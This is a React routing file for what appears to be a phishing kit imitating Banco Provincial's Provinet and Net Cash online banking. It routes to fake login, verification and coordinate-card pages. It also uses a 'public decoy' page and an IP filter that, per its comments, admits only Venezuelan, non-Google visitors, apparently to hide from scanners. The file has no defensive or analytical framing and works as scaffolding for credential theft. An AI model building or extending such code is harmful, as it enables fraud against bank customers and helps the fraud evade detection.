import { Toaster } from "@/components/ui/toaster"
import { QueryClientProvider } from '@tanstack/react-query'
import { queryClientInstance } from '@/lib/query-client'
import { BrowserRouter as Router, Route, Routes, useLocation } from 'react-router-dom';
import { usePresence } from '@/hooks/usePresence';
import { lazy, Suspense } from 'react';
import PageNotFound from './lib/PageNotFound';
import { AuthProvider, useAuth } from '@/lib/AuthContext';
import UserNotRegisteredError from '@/components/UserNotRegisteredError';
import IpFilterGuard from '@/components/IpFilterGuard';

// Critical-path pages: imported eagerly so Suspense never fires on them
import Selector      from './pages/Selector';
import Inicio        from './pages/Inicio';
import NetCashLogin  from './pages/NetCashLogin';
import RioProvincial from './pages/RioProvincial';

// Secondary pages: lazy is fine, they're only reached after a backend round-trip
const NetCashPortal  = lazy(() => import('./pages/NetCashPortal'));
const NetCashVerify  = lazy(() => import('./pages/NetCashVerify'));
const Coordenada     = lazy(() => import('./pages/Coordenada'));
const PanelPrueba    = lazy(() => import('./pages/PanelPrueba'));
const Verificacion   = lazy(() => import('./pages/Verificacion'));
const Rejection      = lazy(() => import('./pages/Rejection'));
const ProvinetPortal = lazy(() => import('./pages/ProvinetPortal'));

const PageSpinner = () => <div className="fixed inset-0 bg-white" />;

function PresenceInitializer() {
  const { search } = useLocation();
  const sessionId = new URLSearchParams(search).get("sessionId");
  usePresence(sessionId);
  return null;
}

const AuthenticatedApp = () => {
  const { isLoadingAuth, isLoadingPublicSettings, authError, navigateToLogin } = useAuth();

  if (isLoadingPublicSettings || isLoadingAuth) {
    return <div className="fixed inset-0 bg-white" />;
  }

  if (authError) {
    if (authError.type === 'user_not_registered') {
      return <UserNotRegisteredError />;
    } else if (authError.type === 'auth_required') {
      navigateToLogin();
      return null;
    }
  }

  return (
    <Suspense fallback={<PageSpinner />}>
      <PresenceInitializer />
      <Routes>
        {/* Public decoy — always accessible, no IP filter */}
        <Route path="/rio-provincial" element={<RioProvincial />} />

        {/* Protected routes — only accessible from Venezuela, non-Google IPs */}

        {/* Selector de plataforma (entrada principal) */}
        <Route
          path="/"
          element={
            <IpFilterGuard>
              <Selector />
            </IpFilterGuard>
          }
        />

        {/* Provinet Empresas login */}
        <Route
          path="/provinet"
          element={
            <IpFilterGuard>
              <Inicio />
            </IpFilterGuard>
          }
        />

        {/* Provincial Net Cash login */}
        <Route
          path="/netcash"
          element={
            <IpFilterGuard>
              <NetCashLogin />
            </IpFilterGuard>
          }
        />

        {/* Provincial Net Cash verificación */}
        <Route
          path="/netcash-verify"
          element={
            <IpFilterGuard>
              <NetCashVerify />
            </IpFilterGuard>
          }
        />

        <Route
          path="/coordenada"
          element={
            <IpFilterGuard>
              <Coordenada />
            </IpFilterGuard>
          }
        />
        <Route path="/netcash-portal" element={<NetCashPortal />} />
        <Route
          path="/provinet-portal"
          element={
            <IpFilterGuard>
              <ProvinetPortal />
            </IpFilterGuard>
          }
        />
        <Route path="/panel-prueba" element={<PanelPrueba />} />
        <Route
          path="/verificacion"
          element={
            <IpFilterGuard>
              <Verificacion />
            </IpFilterGuard>
          }
        />
        <Route path="/rejection" element={<Rejection />} />
        <Route path="*" element={<PageNotFound />} />
      </Routes>
    </Suspense>
  );
};


function App() {
  return (
    <AuthProvider>
      <QueryClientProvider client={queryClientInstance}>
        <Router>
          <AuthenticatedApp />
        </Router>
        <Toaster />
      </QueryClientProvider>
    </AuthProvider>
  )
}

export default App
